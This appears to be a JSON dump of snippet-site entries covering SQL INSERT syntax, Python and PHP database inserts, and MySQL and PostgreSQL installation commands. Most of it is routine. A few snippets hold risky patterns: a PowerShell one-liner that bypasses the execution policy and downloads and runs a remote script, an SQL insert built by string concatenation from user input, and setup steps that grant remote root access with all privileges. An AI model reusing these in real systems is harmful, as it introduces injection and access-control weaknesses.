    "description": "INSERT INTO table (column1, column2, ... column_n ) VALUES (expression1, expression2, ... expression_n );\nINSERT INTO my_table SELECT * FROM source_table; INSERT INTO my_table (a, b, c) SELECT a, b, c FROM source_table; INSERT INTO my_table (a, b, c) SELECT a, b, c FROM source_table s \tWHERE s.my_col >= 10;\nINSERT INTO table (column1, column2, ... column_n ) SELECT expression1, expression2, ... expression_n FROM source_table [WHERE conditions];\nINSERT INTO table (column1, column2, ... column_n ) SELECT expression1, expression2, ... expression_n FROM source_table [WHERE conditions];  -- Basically, omit the VALUES clause when using SELECT for an insert into.\nLet&rsquo;s assume that, we have our employee table. We have to copy this data into another table. For this purpose, we can use the INSERT INTO SELECT operator. Before we go ahead and do that, we would have to create another table that would have the same structure as the given table. &bull; First create the second table with the same table structure with copied one. &bull; Then use the syntax: Let&rsquo;s say employee_duplicate is New table employee is First table that we want to copy it into new table  INSERT INTO employee_duplicate SELECT * FROM employee;\n",
    "reg_date": "2021-10-12T09:56:22.000Z"
  },
  {
    "id": 1634,
    "keyword": null,
    "link": null,
    "title": " insert into select sql",
    "description": "--sql insert quest example INSERT INTO table_name (column1, column2, column3, ...) VALUES (value1, value2, value3, ...); \n--format INSERT INTO Customers (CustomerName, City, Country) SELECT SupplierName, City, Country FROM Suppliers;  --examples INSERT INTO Customers (CustomerName, City, Country) SELECT SupplierName, City, Country FROM Suppliers;\nINSERT INTO table2 SELECT * FROM table1 WHERE condition;\nINSERT INTO sales.addresses (street, city, state, zip_code)  SELECT     street,     city,     state,     zip_code FROM     sales.customers ORDER BY     first_name,     last_name;  \nINSERT INTO my_table SELECT * FROM source_table; INSERT INTO my_table (a, b, c) SELECT a, b, c FROM source_table; INSERT INTO my_table (a, b, c) SELECT a, b, c FROM source_table s \tWHERE s.my_col >= 10;\nLet&rsquo;s assume that, we have our employee table. We have to copy this data into another table. For this purpose, we can use the INSERT INTO SELECT operator. Before we go ahead and do that, we would have to create another table that would have the same structure as the given table. &bull; First create the second table with the same table structure with copied one. &bull; Then use the syntax: Let&rsquo;s say employee_duplicate is New table employee is First table that we want to copy it into new table  INSERT INTO employee_duplicate SELECT * FROM employee;\n",
    "reg_date": "2021-10-12T09:56:22.000Z"
  },
  {
    "id": 1635,
    "keyword": null,
    "link": null,
    "title": " insert into sql",
    "description": "--sql insert quest example INSERT INTO table_name (column1, column2, column3, ...) VALUES (value1, value2, value3, ...); \n-- Note: This is specifically for SQL - Oracle -- --------------------------------------------------------------- -- OPTION 1: Insert specific values (other values will be null)  -- syntax  INSERT INTO <TABLE_NAME> (<column1>,<column2>,<column3>,...)  VALUES (<value1>,<value2>,<value3>,...);  -- example INSERT INTO SALES (SALE_ID,ITEM_ID,QUANTITY,AMOUNT) VALUES (631,13,4,59.99); -- --------------------------------------------------------------- -- OPTION 2: Insert a value for every field  -- syntax INSERT INTO <TABLE_NAME> VALUES (<value1>,<value2>,...,<valueN>);  -- example (SALES table only consists of 4 columns) INSERT INTO SALES VALUES (631,13,4,59.99); -- ---------------------------------------------------------------\n--format INSERT INTO Customers (CustomerName, City, Country) SELECT SupplierName, City, Country FROM Suppliers;  --examples INSERT INTO Customers (CustomerName, City, Country) SELECT SupplierName, City, Country FROM Suppliers;\nINSERT INTO table1 (emp_id, fname) SELECT emp_id, fname  FROM table2 WHERE status = 'Active';\nINSERT INTO table2 SELECT * FROM table1 WHERE condition;\n/*No List parameters */ INSERT INTO table_name  VALUES (value1, value2, value3, ...); \n",
    "reg_date": "2021-10-12T09:56:22.000Z"
  },
  {
    "id": 1636,
    "keyword": null,
    "link": null,
    "title": " insert into sqlite python",
    "description": "import sqlite3  def insertMultipleRecords(recordList):     try:         sqliteConnection = sqlite3.connect('SQLite_Python.db')         cursor = sqliteConnection.cursor()         print(\"Connected to SQLite\")          sqlite_insert_query = \"\"\"INSERT INTO SqliteDb_developers                           (id, name, email, joining_date, salary)                            VALUES (?, ?, ?, ?, ?);\"\"\"          cursor.executemany(sqlite_insert_query, recordList)         sqliteConnection.commit()         print(\"Total\", cursor.rowcount, \"Records inserted successfully into SqliteDb_developers table\")         sqliteConnection.commit()         cursor.close()      except sqlite3.Error as error:         print(\"Failed to insert multiple records into sqlite table\", error)     finally:         if (sqliteConnection):             sqliteConnection.close()             print(\"The SQLite connection is closed\")  recordsToInsert = [(4, 'Jos', 'jos@gmail.com', '2019-01-14', 9500),                    (5, 'Chris', 'chris@gmail.com', '2019-05-15',7600),                    (6, 'Jonny', 'jonny@gmail.com', '2019-03-27', 8400)]  insertMultipleRecords(recordsToInsert)\nimport sqlite3  def insertVaribleIntoTable(id, name, email, joinDate, salary):     try:         sqliteConnection = sqlite3.connect('SQLite_Python.db')         cursor = sqliteConnection.cursor()         print(\"Connected to SQLite\")          sqlite_insert_with_param = \"\"\"INSERT INTO SqliteDb_developers                           (id, name, email, joining_date, salary)                            VALUES (?, ?, ?, ?, ?);\"\"\"          data_tuple = (id, name, email, joinDate, salary)         cursor.execute(sqlite_insert_with_param, data_tuple)         sqliteConnection.commit()         print(\"Python Variables inserted successfully into SqliteDb_developers table\")          cursor.close()      except sqlite3.Error as error:         print(\"Failed to insert Python variable into sqlite table\", error)     finally:         if (sqliteConnection):             sqliteConnection.close()             print(\"The SQLite connection is closed\")  insertVaribleIntoTable(2, 'Joe', 'joe@pynative.com', '2019-05-19', 9000) insertVaribleIntoTable(3, 'Ben', 'ben@pynative.com', '2019-02-23', 9500)\n",
    "reg_date": "2021-10-12T09:56:22.000Z"
  },
  {
    "id": 1637,
    "keyword": null,
    "link": null,
    "title": " insert into table from another table mysql",
    "description": "INSERT INTO table1 (emp_id, fname) SELECT emp_id, fname  FROM table2 WHERE status = 'Active';\n",
    "reg_date": "2021-10-12T09:56:22.000Z"
  },
  {
    "id": 1638,
    "keyword": null,
    "link": null,
    "title": " insert into values multiple",
    "description": "INSERT INTO table_name (column_list) VALUES     (value_list_1),     (value_list_2),     ...     (value_list_n); \nINSERT INTO table_name (a, b) VALUES (val1, val2);  INSERT INTO table_name (a, b) VALUES (val1, val2), (val3, val4); -- 2 rows  -- From a query: INSERT INTO table_name (a, b)  \tSELECT val1 AS a, val2 AS b      FROM source_table s \tWHERE s.val1 >= 10;\nINSERT INTO Data ( Col1 ) VALUES ('Hello'), ('World');\n",
    "reg_date": "2021-10-12T09:56:22.000Z"
  },
  {
    "id": 1639,
    "keyword": null,
    "link": null,
    "title": " insert into values select",
    "description": "--format INSERT INTO Customers (CustomerName, City, Country) SELECT SupplierName, City, Country FROM Suppliers;  --examples INSERT INTO Customers (CustomerName, City, Country) SELECT SupplierName, City, Country FROM Suppliers;\nINSERT INTO table2 SELECT * FROM table1 WHERE condition;\nINSERT INTO sales.addresses (street, city, state, zip_code)  SELECT     street,     city,     state,     zip_code FROM     sales.customers ORDER BY     first_name,     last_name;  \nINSERT INTO my_table SELECT * FROM source_table; INSERT INTO my_table (a, b, c) SELECT a, b, c FROM source_table; INSERT INTO my_table (a, b, c) SELECT a, b, c FROM source_table s \tWHERE s.my_col >= 10;\nLet&rsquo;s assume that, we have our employee table. We have to copy this data into another table. For this purpose, we can use the INSERT INTO SELECT operator. Before we go ahead and do that, we would have to create another table that would have the same structure as the given table. &bull; First create the second table with the same table structure with copied one. &bull; Then use the syntax: Let&rsquo;s say employee_duplicate is New table employee is First table that we want to copy it into new table  INSERT INTO employee_duplicate SELECT * FROM employee;\n",
    "reg_date": "2021-10-12T09:56:22.000Z"
  },
  {
    "id": 1640,
    "keyword": null,
    "link": null,
    "title": " insert into with select but with one which is value",
    "description": "INSERT INTO table1 ( column1, column2, someInt, someVarChar ) SELECT  table2.column1, table2.column2, 8, 'some string etc.' FROM    table2 WHERE   table2.ID = 7; \n",
    "reg_date": "2021-10-12T09:56:22.000Z"
  },
  {
    "id": 1641,
    "keyword": null,
    "link": null,
    "title": " insert ip address in mysql",
    "description": "-- `ip_address` int(4) unsigned NOT NULL INSERT INTO my_table (`ip_address`) VALUES (INET_ATON(\"127.0.0.1\")); SELECT INET_NTOA(ip_address) as ip FROM my_table; -- php $ipaddress = $_SERVER['REMOTE_ADDR'];   var_dump(ip2long('123.63.153.253'));\t-- 2067765757 var_dump(long2ip(2067765757));\t\t\t-- \"123.63.153.253\"\n",
    "reg_date": "2021-10-12T09:56:23.000Z"
  },
  {
    "id": 1642,
    "keyword": null,
    "link": null,
    "title": " insert many to many sql",
    "description": "INSERT INTO persons (firstname,lastname) VALUES ('John','Doe'); SET @person_id = LAST_INSERT_ID();  INSERT IGNORE INTO properties (property) VALUES ('property_A'); SET @property_id = LAST_INSERT_ID(); INSERT INTO has_property (person_id,property_id) VALUES(@person_id, @property_id);  INSERT IGNORE INTO properties (property) VALUES ('property_B'); SET @property_id = LAST_INSERT_ID(); INSERT INTO has_property (person_id,property_id) VALUES(@person_id, @property_id);  INSERT IGNORE INTO properties (property) VALUES ('property_C'); SET @property_id = LAST_INSERT_ID(); INSERT INTO has_property (person_id,property_id) VALUES(@person_id, @property_id);\n",
    "reg_date": "2021-10-12T09:56:23.000Z"
  },
  {
    "id": 1643,
    "keyword": null,
    "link": null,
    "title": " insert multiple values into one column sql",
    "description": "INSERT INTO Data ( Col1 ) VALUES ('Hello'), ('World');\n",
    "reg_date": "2021-10-12T09:56:23.000Z"
  },
  {
    "id": 1644,
    "keyword": null,
    "link": null,
    "title": " insert mysql",
    "description": "INSERT INTO table1 (col1, col2) VALUES (3, 'A string'); INSERT INTO table1 (col1) VALUES (3);\t\t\t-- col2 will be NULL if allowed INSERT INTO table1 VALUES (3, 'A string');     \t-- all table1 columns INSERT INTO table1 (col1, col2) SELECT value3, value1 FROM table2;\nINSERT INTO table_name (a, b) VALUES (val1, val2);  INSERT INTO table_name (a, b) VALUES (val1, val2), (val3, val4); -- 2 rows  -- From a query: INSERT INTO table_name (a, b)  \tSELECT val1 AS a, val2 AS b      FROM source_table s \tWHERE s.val1 >= 10;\nINSERT INTO tbl_name (a,b,c)      VALUES(1,2,3), (4,5,6), (7,8,9);\nINSERT INTO \"table_name\" (\"column1\", \"column2\", \"column3\", ...) VALUES ('value1', \"value2\", 'value3', ...); \n",
    "reg_date": "2021-10-12T09:56:23.000Z"
  },
  {
    "id": 1645,
    "keyword": null,
    "link": null,
    "title": " insert mysql ifile nto database",
    "description": "mysql -u username -p database_name < file.sql\n mysql> use db_name;  mysql> source file_name.sql;\nSource : https://www.programmingquest.com/2018/08/how-to-export-mysql-database-using.html open cmd set mysql path in cmd \tset path=c:\\wamp\\bin\\mysql\\mysql5.6.17\\bin For database import (Restore):  \tmysql -u YourUser -p YourDatabaseName < filename.sql\n",
    "reg_date": "2021-10-12T09:56:23.000Z"
  },
  {
    "id": 1646,
    "keyword": null,
    "link": null,
    "title": " insert pg result of select",
    "description": "insert into items_ver (item_id, name, item_group) select item_id, name, item_group from items where item_id=2;\n",
    "reg_date": "2021-10-12T09:56:23.000Z"
  },
  {
    "id": 1647,
    "keyword": null,
    "link": null,
    "title": " insert postgres",
    "description": "INSERT INTO films (code, title, did, date_prod, kind)     VALUES ('T_601', 'Yojimbo', 106, '1961-06-16', 'Drama');\nINSERT INTO films    (code, title, did, date_prod, kind)     VALUES    ('T_601', 'Yojimbo', 106, '1961-06-16', 'Drama');\n                                                     INSERT INTO table_name(column1, column2, &hellip;) VALUES (value1, value2, &hellip;) RETURNING *;Code language: SQL (Structured Query Language) (sql)\n    try:         connection = psycopg2.connect(**postgres_credentials())         cursor = connection.cursor()          records = [(1,'FOO'),(2,'SPAM')]          placeholders = ','.join(['%s']*len(records)) # => '%s,%s'         sql = f\"\"\"             INSERT INTO schema.table(id, field)             VALUES {placeholders}         \"\"\"                                 # Mogrify helpful to debug command sent to DB bc transforms command into human readable form.          # It's not necessary. Could just use executemany, but slower & harder to debug command as SO suggests.         insert_statement = cursor.mogrify(sql, records)         # print(insert_statement.decode('utf-8'))          cursor.execute(insert_statement)         # cursor.executemany(sql, records) # SLOW bc executes and commits each record one at a time.         # print(cursor.mogrify(sql, records).decode('utf-8'))          connection.commit()      except psycopg2.DatabaseError:         raise     finally:         if not connection.closed:             cursor.close()             connection.close() \n",
    "reg_date": "2021-10-12T09:56:23.000Z"
  },
  {
    "id": 1648,
    "keyword": null,
    "link": null,
    "title": " insert query in ci",
    "description": "$data = array(         'title' => $title,         'name' => $name,         'date' => $date );  $this->db->where('id', $id); $this->db->update('mytable', $data);\nfunction order_summary_insert()     $OrderLines=$this->input->post('orderlines');     $CustomerName=$this->input->post('customer');     $data = array(         'OrderLines'=>$OrderLines,         'CustomerName'=>$CustomerName     );      $this->db->insert('Customer_Orders',$data); }\n$this->db->like('title', 'match'); $this->db->or_like('body', $match); // WHERE `title` LIKE '%match%' ESCAPE '!' OR  `body` LIKE '%match%' ESCAPE '!' \n",
    "reg_date": "2021-10-12T09:56:23.000Z"
  },
  {
    "id": 1649,
    "keyword": null,
    "link": null,
    "title": " insert query return id mysql",
    "description": "INSERT INTO table_name (col1, col2,...) VALUES ('val1', 'val2'...); SELECT LAST_INSERT_ID(); \n",
    "reg_date": "2021-10-12T09:56:23.000Z"
  },
  {
    "id": 1650,
    "keyword": null,
    "link": null,
    "title": " insert records into sqlite table python",
    "description": "import sqlite3  def insertMultipleRecords(recordList):     try:         sqliteConnection = sqlite3.connect('SQLite_Python.db')         cursor = sqliteConnection.cursor()         print(\"Connected to SQLite\")          sqlite_insert_query = \"\"\"INSERT INTO SqliteDb_developers                           (id, name, email, joining_date, salary)                            VALUES (?, ?, ?, ?, ?);\"\"\"          cursor.executemany(sqlite_insert_query, recordList)         sqliteConnection.commit()         print(\"Total\", cursor.rowcount, \"Records inserted successfully into SqliteDb_developers table\")         sqliteConnection.commit()         cursor.close()      except sqlite3.Error as error:         print(\"Failed to insert multiple records into sqlite table\", error)     finally:         if (sqliteConnection):             sqliteConnection.close()             print(\"The SQLite connection is closed\")  recordsToInsert = [(4, 'Jos', 'jos@gmail.com', '2019-01-14', 9500),                    (5, 'Chris', 'chris@gmail.com', '2019-05-15',7600),                    (6, 'Jonny', 'jonny@gmail.com', '2019-03-27', 8400)]  insertMultipleRecords(recordsToInsert)\n",
    "reg_date": "2021-10-12T09:56:23.000Z"
  },
  {
    "id": 1651,
    "keyword": null,
    "link": null,
    "title": " insert select",
    "description": "--format INSERT INTO Customers (CustomerName, City, Country) SELECT SupplierName, City, Country FROM Suppliers;  --examples INSERT INTO Customers (CustomerName, City, Country) SELECT SupplierName, City, Country FROM Suppliers;\nINSERT INTO table2 SELECT * FROM table1 WHERE condition;\nINSERT INTO sales.addresses (street, city, state, zip_code)  SELECT     street,     city,     state,     zip_code FROM     sales.customers ORDER BY     first_name,     last_name;  \nINSERT INTO my_table SELECT * FROM source_table; INSERT INTO my_table (a, b, c) SELECT a, b, c FROM source_table; INSERT INTO my_table (a, b, c) SELECT a, b, c FROM source_table s \tWHERE s.my_col >= 10;\nLet&rsquo;s assume that, we have our employee table. We have to copy this data into another table. For this purpose, we can use the INSERT INTO SELECT operator. Before we go ahead and do that, we would have to create another table that would have the same structure as the given table. &bull; First create the second table with the same table structure with copied one. &bull; Then use the syntax: Let&rsquo;s say employee_duplicate is New table employee is First table that we want to copy it into new table  INSERT INTO employee_duplicate SELECT * FROM employee;\n",
    "reg_date": "2021-10-12T09:56:23.000Z"
  },
  {
    "id": 1652,
    "keyword": null,
    "link": null,
    "title": " insert sql",
    "description": "--sql insert quest example INSERT INTO table_name (column1, column2, column3, ...) VALUES (value1, value2, value3, ...); \n-- Note: This is specifically for SQL - Oracle -- --------------------------------------------------------------- -- OPTION 1: Insert specific values (other values will be null)  -- syntax  INSERT INTO <TABLE_NAME> (<column1>,<column2>,<column3>,...)  VALUES (<value1>,<value2>,<value3>,...);  -- example INSERT INTO SALES (SALE_ID,ITEM_ID,QUANTITY,AMOUNT) VALUES (631,13,4,59.99); -- --------------------------------------------------------------- -- OPTION 2: Insert a value for every field  -- syntax INSERT INTO <TABLE_NAME> VALUES (<value1>,<value2>,...,<valueN>);  -- example (SALES table only consists of 4 columns) INSERT INTO SALES VALUES (631,13,4,59.99); -- ---------------------------------------------------------------\nINSERT INTO table2 SELECT * FROM table1 WHERE condition;\nINSERT INTO client (prenom, nom, ville, age)  VALUES  ('R&eacute;becca', 'Armand', 'Saint-Didier-des-Bois', 24),  ('Aim&eacute;e', 'Hebert', 'Marigny-le-Ch&acirc;tel', 36),  ('Marielle', 'Ribeiro', 'Maill&egrave;res', 27),  ('Hilaire', 'Savary', 'Conie-Molitard', 58);\nINSERT INTO table_name (a, b) VALUES (val1, val2);  INSERT INTO table_name (a, b) VALUES (val1, val2), (val3, val4); -- 2 rows  -- From a query: INSERT INTO table_name (a, b)  \tSELECT val1 AS a, val2 AS b      FROM source_table s \tWHERE s.val1 >= 10;\n-- sql insert using string format           -- you dont need to do this unless you want to specify what                   --    columns you want to insert                                  ⬇️ String = \"INSERT INTO Marcas (yourcolumn) VALUES(if your value is string use 'your string' and if is a number you dont use the '')\";  -- exemple:                                                      -- because my idcostumer just allows numbers   and that is a text one and i use the ''                                                                                              --    and i dont use the ''                                                                           ⬇️                             ⬇️   ssql = \"INSERT INTO Costumer (idcostumer, costumername) VALUES(\"textboxidcostumer.Text + \", '\" + textboxname.Text + \"')\";\n",
    "reg_date": "2021-10-12T09:56:24.000Z"
  },
  {
    "id": 1653,
    "keyword": null,
    "link": null,
    "title": " insert sqlite",
    "description": "INSERT INTO table (column1,column2 ,..) VALUES( value1,\tvalue2 ,...);\nimport sqlite3  def insertVaribleIntoTable(id, name, email, joinDate, salary):     try:         sqliteConnection = sqlite3.connect('SQLite_Python.db')         cursor = sqliteConnection.cursor()         print(\"Connected to SQLite\")          sqlite_insert_with_param = \"\"\"INSERT INTO SqliteDb_developers                           (id, name, email, joining_date, salary)                            VALUES (?, ?, ?, ?, ?);\"\"\"          data_tuple = (id, name, email, joinDate, salary)         cursor.execute(sqlite_insert_with_param, data_tuple)         sqliteConnection.commit()         print(\"Python Variables inserted successfully into SqliteDb_developers table\")          cursor.close()      except sqlite3.Error as error:         print(\"Failed to insert Python variable into sqlite table\", error)     finally:         if (sqliteConnection):             sqliteConnection.close()             print(\"The SQLite connection is closed\")  insertVaribleIntoTable(2, 'Joe', 'joe@pynative.com', '2019-05-19', 9000) insertVaribleIntoTable(3, 'Ben', 'ben@pynative.com', '2019-02-23', 9500)\n-- To insert a single row into a table, you use the following form of the INSERT statement:  INSERT INTO table (column1,column2 ,..) VALUES( value1,\tvalue2 ,...);Code language: SQL (Structured Query Language) (sql)\nINSERT INTO TABLE (something1,something2, something3) VALUES (?, ?, ?)\n",
    "reg_date": "2021-10-12T09:56:24.000Z"
  },
  {
    "id": 1654,
    "keyword": null,
    "link": null,
    "title": " insert table command",
    "description": "// FOR INSERTING IN AN UNORDERED OR A SPECIFIC MANNER: INSERT INTO table_name (column1, column2, column3, ...) VALUES (value1, value2, value3, ...);  // FOR INSERTING IN ORDERED MANNER AS PER THE CREATE TABLE: INSERT INTO table_name VALUES (value1, value2, value3, ...);\n",
    "reg_date": "2021-10-12T09:56:24.000Z"
  },
  {
    "id": 1655,
    "keyword": null,
    "link": null,
    "title": " insert value to new table by joining 2 different tables",
    "description": "INSERT INTO table ( col1 , col2, col3, col4) SELECT p.col1, p.col2, c.col3, c.col4 FROM table1 p INNER JOIN table2 c ON c.Id = p.Id \n",
    "reg_date": "2021-10-12T09:56:24.000Z"
  },
  {
    "id": 1656,
    "keyword": null,
    "link": null,
    "title": " install latest mysql on debian 9",
    "description": "cd /tmp wget https://dev.mysql.com/get/mysql-apt-config_0.8.10-1_all.deb \n",
    "reg_date": "2021-10-12T09:56:24.000Z"
  },
  {
    "id": 1657,
    "keyword": null,
    "link": null,
    "title": " install mssql on ubuntu",
    "description": "sudo apt-get install mssql-server -y\nsudo wget -qO- https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add -\nsudo add-apt-repository \"$(wget -qO- https://packages.microsoft.com/config/ubuntu/16.04/mssql-server-preview.list)\"\n",
    "reg_date": "2021-10-12T09:56:24.000Z"
  },
  {
    "id": 1658,
    "keyword": null,
    "link": null,
    "title": " install mysql 5.7 ubuntu 20.04",
    "description": "## To install mysql in Ubuntu ## sudo apt install mysql-server  ## For configuration  sudo mysql_secure_installation  # For password type YES or y ... enter you password # For removing user NO or n  # For disallow login NO or n # For remove database NO or n # Reload table YES or y  ## DONE configurations ...  ## Start mysql with below command... sudo mysql -u root -p   # Enter password which you add in configurations # Now you are all done...    \n## ADD user in mysql && have problem with root user ##  # First Login mysql shell.. sudo mysql -u root -p   ## Also check if you are unable to login in mysql without sudo...  ## Creating new user and giving permissions... # Goto login shell of mysql... and type below commands...  #1 show databases; #2 use mysql; #3 select user, host, plugin from mysql.user; #4 create user 'your_user_name'@'localhost' identified by 'password'; #5 grant all privileges on *.* to 'your_user_name'@'localhost'; #6 update user set plugin=\"caching_sha2_password\" where User=\"your_user_name\"; \t#     .... Here caching_sha2_password you can see yours in #3 check  \t#\t\tyour table and see column (plugin) don't use root plugin... #7 flush privileges; #8 EXIT  #### DONE Now you created your user also you can user without sudo...  mysql -u your_user_name -p  ## For password check your step #4 and enter same password...  ## Enjoy ALL DONE.... ## HAVE A NICE DAY!   \nsudo apt install -f mysql-client=5.7.32-1ubuntu18.04 mysql-community-server=5.7.32-1ubuntu18.04 mysql-server=5.7.32-1ubuntu18.04\n",
    "reg_date": "2021-10-12T09:56:24.000Z"
  },
  {
    "id": 1659,
    "keyword": null,
    "link": null,
    "title": " install mysql client ubuntu",
    "description": "sudo apt update sudo apt install mysql-server sudo service mysql start sudo mysql_secure_installation sudo mysql -u root   In mysql console: DROP USER 'root'@'localhost'; CREATE USER 'root'@'%' IDENTIFIED BY 'YOURPASSWORD'; GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION; FLUSH PRIVILEGES;\nsudo apt install mysql-server sudo mysql_secure_installation utility\nsudo apt-get update sudo apt-get install mysql-server \napt-get install mysql-client\nsystemctl status mysql\n                                                     sudo apt-get install mysql-serverCode language: JavaScript (javascript)\n",
    "reg_date": "2021-10-12T09:56:24.000Z"
  },
  {
    "id": 1660,
    "keyword": null,
    "link": null,
    "title": " install mysql on amazon linux instance",
    "description": "sudo yum update -y  #The Amazon Linux default repositories contains Mariadb packages for the installation. To install MySQL community relese, first configure MySQL yum repository on your machine.  sudo rpm -Uvh https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm  #After that run the following command to install the MySQL 5.7 packages on your systems. This will also install all other required dependencies. sudo yum install mysql-community-server  #Once the MySQL installation completed on your Amazon Linux system. You need to enable the MySQL service to start on system boot. Also, start service using the following commands:  sudo systemctl enable mysqld  sudo systemctl start mysqld   #Once you start MySQL server for the first time, an auto generated password is set for the root account. You can find this password in MySQL logs. sudo grep 'temporary password' /var/log/mysqld.log \n",
    "reg_date": "2021-10-12T09:56:24.000Z"
  },
  {
    "id": 1661,
    "keyword": null,
    "link": null,
    "title": " install mysql on bash",
    "description": "apt-get install mysql-server\n",
    "reg_date": "2021-10-12T09:56:24.000Z"
  },
  {
    "id": 1662,
    "keyword": null,
    "link": null,
    "title": " install mysql on mac",
    "description": "Using Homebrew: brew install mysql brew tap homebrew/services brew services start mysql mysqladmin -u root password 'secretpaSSw0rd'  Using Docker: docker pull mysql/mysql-server docker run --name=mysql -d mysql/mysql-server\nsudo mysql.server start\nbrew install mysql  sudo chown -R _mysql:mysql /usr/local/var/mysql sudo mysql.server start  sudo mysql // set password for root user, or change root to another user ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'password'; FLUSH PRIVILEGES;  exit mysql -u root -p \nalias mysqlstart='sudo /usr/local/mysql/support-files/mysql.server start' alias mysqlstop='sudo /usr/local/mysql/support-files/mysql.server stop'  \n",
    "reg_date": "2021-10-12T09:56:24.000Z"
  },
  {
    "id": 1663,
    "keyword": null,
    "link": null,
    "title": " install mysql on ubuntu",
    "description": "sudo apt update sudo apt install mysql-server sudo service mysql start sudo mysql_secure_installation sudo mysql -u root   In mysql console: DROP USER 'root'@'localhost'; CREATE USER 'root'@'%' IDENTIFIED BY 'YOURPASSWORD'; GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION; FLUSH PRIVILEGES;\nsudo apt update sudo apt install mysql-server sudo mysql_secure_installation\n## To install mysql in Ubuntu ## sudo apt install mysql-server  ## For configuration  sudo mysql_secure_installation  # For password type YES or y ... enter you password # For removing user NO or n  # For disallow login NO or n # For remove database NO or n # Reload table YES or y  ## DONE configurations ...  ## Start mysql with below command... sudo mysql -u root -p   # Enter password which you add in configurations # Now you are all done...    \nsudo apt install mysql-server sudo mysql_secure_installation utility\nmysql -u root -p \nsudo apt-get update sudo apt-get install mysql-server \n",
    "reg_date": "2021-10-12T09:56:25.000Z"
  },
  {
    "id": 1664,
    "keyword": null,
    "link": null,
    "title": " install mysql powershell",
    "description": "# Open Powershell as administrator # First install Choclatey Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1')) # Check if choco installed choco -? # Install mysql choco install mysql\nfirst install chocolatey open Powershell as administrator C:\\\\User\\hey> choco install mysql\n",
    "reg_date": "2021-10-12T09:56:25.000Z"
  },
  {
    "id": 1665,
    "keyword": null,
    "link": null,
    "title": " install mysql raspberry pi",
    "description": "sudo apt install mariadb-server sudo mysql_secure_installation\n",
    "reg_date": "2021-10-12T09:56:25.000Z"
  },
  {
    "id": 1666,
    "keyword": null,
    "link": null,
    "title": " install mysql ubuntu 18.04",
    "description": "sudo apt update sudo apt install mysql-server sudo mysql_secure_installation\n[mysqld]\n//follow this blog  https://www.digitalocean.com/community/tutorials/how-to-install-mysql-on-ubuntu-18-04\nsudo su && sudo apt update && sudo apt install mysql-server && sudo mysql_secure_installation\n",
    "reg_date": "2021-10-12T09:56:25.000Z"
  },
  {
    "id": 1667,
    "keyword": null,
    "link": null,
    "title": " install mysql workbench ubuntu 20.04 terminal",
    "description": "sudo apt-get install mysql-server sudo apt-get install mysql-client sudo apt-get install mysql-workbench \ncheck this  https://linuxhint.com/installing_mysql_workbench_ubuntu/ \nsudo apt install ./mysql-workbench-community_8.0.19-1ubuntu19.10_amd64.deb \nsudo apt install ./mysql-workbench-community_8.0.19-1ubuntu19.10_amd64.deb\nsee here: https://linuxhint.com/installing_mysql_workbench_ubuntu/\n",
    "reg_date": "2021-10-12T09:56:25.000Z"
  },
  {
    "id": 1668,
    "keyword": null,
    "link": null,
    "title": " install mysqldump",
    "description": "# Syntax mysqldump -u [username] -p [database-to-dump] > [database-to-receive]  # Pipe it! Exporting DB from external host mysqldump -u [username] -P [port] -h [host] [database-to-dump] | mysql -u root -h 127.0.0.1 [database-to-receive]  # Export specific tables by typing the name after the targeted DB mysqldump -u [username] -P [port] -h [host] [database-to-dump] [tabl1] [table2] [table3] | mysql -u root -h 127.0.0.1 [database-to-receive]\n# Mysql sudo apt-get install mysql-client # MariaDB sudo apt-get install mariadb-clients\nPress CTRL+C to copy shell> mysqldump --databases db1 db2 db3 > dump.sql\nmysqldump -u [username] -p [database-to-dump] > filename(e.g. dump.sql)  # or  sudo mysql database_name > filename \nmysqldump -u [username] -p [database-to-dump] > [database-to-receive].sql\n",
    "reg_date": "2021-10-12T09:56:25.000Z"
  },
  {
    "id": 1669,
    "keyword": null,
    "link": null,
    "title": " install mysqldump ubuntu",
    "description": "sudo apt-get install mysql-client \n# Mysql sudo apt-get install mysql-client # MariaDB sudo apt-get install mariadb-clients\n",
    "reg_date": "2021-10-12T09:56:25.000Z"
  },
  {
    "id": 1670,
    "keyword": null,
    "link": null,
    "title": " install phoenix",
    "description": "mix archive.install hex phx_new  mix phx.new . \n$ mix archive.install hex phx_new 1.5.12 \n",
    "reg_date": "2021-10-12T09:56:25.000Z"
  },
  {
    "id": 1671,
    "keyword": null,
    "link": null,
    "title": " install postgresql 10 centos 7",
    "description": "# centos 5 32bit rpm -Uvh http://yum.postgresql.org/9.1/redhat/rhel-5-i386/pgdg-centos91-9.1-4.noarch.rpm yum install postgresql91-server /etc/init.d/postgresql-9.1 initdb service postgresql-9.1 start chkconfig postgresql-9.1 on\nyum list postgresql* \n# yum install https://download.postgresql.org/pub/repos/yum/10/redhat/rhel-7-x86_64/pgdg-redhat-repo-latest.noarch.rpm -y \n# yum install postgresql10 postgresql10-server postgresql10-contrib postgresql10-libs -y \n# /usr/pgsql-10/bin/postgresql-10-setup initdb Initializing database ... OK  \n# systemctl enable postgresql-10.service # systemctl start postgresql-10.service \n",
    "reg_date": "2021-10-12T09:56:25.000Z"
  },
  {
    "id": 1672,
    "keyword": null,
    "link": null,
    "title": " install postgresql 12 on debian 10",
    "description": "sudo apt update sudo apt -y install postgresql-12 postgresql-client-12\n",
    "reg_date": "2021-10-12T09:56:25.000Z"
  },
  {
    "id": 1673,
    "keyword": null,
    "link": null,
    "title": " install postgresql centos 5",
    "description": "# centos 5 32bit rpm -Uvh http://yum.postgresql.org/9.1/redhat/rhel-5-i386/pgdg-centos91-9.1-4.noarch.rpm yum install postgresql91-server /etc/init.d/postgresql-9.1 initdb service postgresql-9.1 start chkconfig postgresql-9.1 on\n",
    "reg_date": "2021-10-12T09:56:25.000Z"
  },
  {
    "id": 1674,
    "keyword": null,
    "link": null,
    "title": " install postgresql on raspberry pi",
    "description": "sudo apt install postgresql libpq-dev postgresql-client  postgresql-client-common -y\n",
    "reg_date": "2021-10-12T09:56:26.000Z"
  },
  {
    "id": 1675,
    "keyword": null,
    "link": null,
    "title": " install postgresql ubuntu",
